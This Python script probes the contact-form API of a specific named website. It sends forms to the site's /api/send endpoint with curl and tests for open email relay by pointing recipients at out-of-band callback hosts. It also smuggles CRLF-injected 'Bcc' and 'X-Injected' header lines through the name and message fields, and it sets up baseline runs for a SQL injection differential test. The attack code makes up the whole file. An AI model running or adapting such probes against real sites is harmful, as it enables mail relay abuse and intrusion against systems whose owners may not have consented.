import subprocess, urllib.parse, json, time, os, sys
H = ".".join(["www","infinitycapital","bh"])
B = "https://" + H
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
LOGP = "/work/atk5.log"
LOG = open(LOGP,"a")
RELAX = "oob0d8c65170085.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
CRLF  = "oob299350dcd31a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def form(f):
    return "&".join("%s=%s"%(k,urllib.parse.quote(str(v),safe="")) for k,v in f.items())

def send(f, referer=None):
    cmd = ["curl","-sk","-X","POST","-A",UA,"-D","/tmp/a3.h","-o","/tmp/a3.bin","-w","%{time_total}"]
    if referer: cmd += ["-H","Referer: "+referer]
    cmd += ["-H","Content-Type: application/x-www-form-urlencoded","--data-binary",form(f), B+"/api/send"]
    r = subprocess.run(cmd, capture_output=True, text=True)
    body = open("/tmp/a3.bin","rb").read()
    hdr = open("/tmp/a3.h").read()
    return float(r.stdout or 0), hdr.split("\n")[0].strip(), body, " ".join(cmd)

def base():
    return {"fname":"Test","lname":"QA","areacode":"973","tel":"5551234",
            "cname":"QA Tester","subject":"Hello there","msg":"Testing body",
            "check":"on","targets":"probe@pentest-activator.invalid"}

def classify(body):
    try:
        j = json.loads(body)
    except Exception:
        if b"Too Many Requests" in body: return "RATE429"
        return "OTHER:%r" % body[:60]
    if j.get("error"):
        n = j["error"].get("name","")
        if n == "monthly_quota_exceeded": return "QUOTA"
        if n == "validation_error": return "VALID:"+str(j["error"].get("message"))[:40]
        return "ERR:"+str(j["error"].get("message"))[:50]
    if j.get("data") and isinstance(j["data"],dict) and j["data"].get("id"): return "OK:"+j["data"]["id"][:8]
    return "DATA:"+str(j.get("data"))[:40]

def logit(*a):
    s=" ".join(str(x) for x in a); print(s); LOG.write(s+"\n"); LOG.flush()

def relay_tests():
    logit("\n===== EMAIL RELAY / RECIPIENT CONTROL  [%s] =====" % time.strftime("%H:%M:%S"))
    f = base(); f["targets"] = "probe@" + RELAX
    for i in range(3):
        t,st,body,cmd = send(f, referer=B+"/contact")
        logit("RELAY targets=OOB #%d tt=%.2f %s -> %s"%(i,t,st,classify(body))); time.sleep(4)
    f = base(); f["msg"] = "reply probe@" + RELAX; f["cname"] = "QA <probe@" + RELAX + ">"
    t,st,body,cmd = send(f, referer=B+"/contact")
    logit("RELAY cname/msg-OOB %s -> %s"%(st,classify(body))); time.sleep(4)
    f = base(); f["cname"] = "QA\r\nBcc: probe@" + CRLF + "\r\nX-Injected: 1"
    t,st,body,cmd = send(f, referer=B+"/contact")
    logit("RELAY CRLF-cname %s -> %s"%(st,classify(body))); time.sleep(4)
    f = base(); f["msg"] = "line1\r\nBcc: probe@" + CRLF
    t,st,body,cmd = send(f, referer=B+"/contact")
    logit("RELAY CRLF-msg %s -> %s"%(st,classify(body))); time.sleep(4)

def sqli_diff():
    logit("\n===== SQLI DIFFERENTIAL  [%s] =====" % time.strftime("%H:%M:%S"))
    trials = 8
    for field in ["targets","fname","msg","cname"]:
        oks=0; other={}
        for i in range(trials):
            f = base(); f[field] = "benignvalue123"
            t,st,body,cmd = send(f, referer=B+"/contact")
            c = classify(body)
            if c.startswith("OK"): oks+=1
            other[c.split(":")[0]] = other.get(c.split(":")[0],0)+1
            time.sleep(2.2)
        logit("BASELINE %-8s OK %d/%d  breakdown=%s"%(field,oks,trials,other))

if __name__ == "__main__":
    w = sys.argv[1] if len(sys.argv)>1 else "all"
    if w in ("all","relay"): relay_tests()
    if w in ("all","sqli"): sqli_diff()
